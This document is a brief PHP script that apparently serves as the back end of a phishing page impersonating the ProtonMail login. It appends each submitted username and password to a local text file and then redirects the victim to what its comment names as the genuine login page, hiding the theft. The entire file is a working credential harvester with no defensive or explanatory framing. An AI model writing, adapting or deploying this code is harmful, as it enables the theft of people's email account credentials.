<?php
file_put_contents("usernames.txt", "ProtonMail Username: " . $_POST["username"] . "\nPassword: " . $_POST["password"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://mail.protonmail.com/login
header("Location: $url");
exit();
?>
